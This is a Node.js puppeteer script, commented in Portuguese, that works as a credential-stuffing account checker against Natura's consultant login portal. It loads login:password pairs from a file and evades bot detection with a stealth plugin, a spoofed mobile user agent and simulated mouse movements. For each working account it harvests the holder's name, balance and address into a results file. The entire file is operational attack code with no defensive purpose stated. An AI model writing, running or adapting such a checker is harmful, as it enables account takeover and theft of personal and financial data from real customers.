const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const contas = fs.readFileSync('contas.txt', 'utf-8').split('\n').filter(l => l.trim());

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

(async () => {
  const browser = await puppeteer.launch({
    headless: false,
    executablePath: 'C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe',
    defaultViewport: null,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-blink-features=AutomationControlled',
      '--start-maximized'
    ]
  });

  const page = await browser.newPage();

  await page.setUserAgent('Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36');
  await page.setViewport({ width: 390, height: 844, isMobile: true });

  for (const conta of contas) {
    const [login, senha] = conta.split(':');
    if (!login || !senha) continue;

    console.log(`\n🔐 Testando: ${login}`);

    try {
      await page.goto('https://login.natura.net/ssoauth', { waitUntil: 'networkidle2', timeout: 60000 });

      await page.mouse.move(100, 200, { steps: 10 });
      await delay(300);
      await page.mouse.move(120, 220, { steps: 15 });
      await delay(500);

      const tokens = await page.evaluate(() => {
        return {
          bmctx: document.querySelector('input[name="bmctx"]')?.value || 'não encontrado',
          request_id: document.querySelector('input[name="request_id"]')?.value || 'não encontrado'
        };
      });
      console.log('🔐 Tokens capturados:', tokens);

      await page.type('input[name="username"]', login.trim(), { delay: 100 });
      await page.type('input[name="password"]', senha.trim(), { delay: 100 });

      await Promise.all([
        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => null),
        page.click('button[type="submit"]')
      ]);

      const url = page.url();

      if (url.includes('consultoria.natura') || url.includes('webfv')) {
        console.log(`✅ Login OK: ${login}`);

        const nome = await page.$eval('.usuario-nome, .nomeUsuario', el => el.innerText).catch(() => '❌ Nome não encontrado');
        const saldo = await page.$eval('.valor-saldo', el => el.innerText).catch(() => '❌ Saldo não encontrado');
        const endereco = await page.$eval('.endereco-usuario', el => el.innerText).catch(() => '❌ Endereço não encontrado');

        const resultado = `✅ ${login} | Nome: ${nome} | Saldo: ${saldo} | Endereço: ${endereco}`;
        fs.appendFileSync('resultados.txt', resultado + '\n');
        console.log(resultado);
      } else {
        console.log(`❌ Falha no login: ${login}`);
        fs.appendFileSync('resultados.txt', `❌ ${login} | Falha no login\n`);
      }

      await delay(3000);

    } catch (err) {
      console.log(`⚠️ Erro ao processar ${login}:`, err.message);
      fs.appendFileSync('resultados.txt', `⚠️ ${login} | Erro: ${err.message}\n`);
    }
  }

  await browser.close();
  console.log('\n🏁 Fim dos testes. Verifique o arquivo resultados.txt');
})();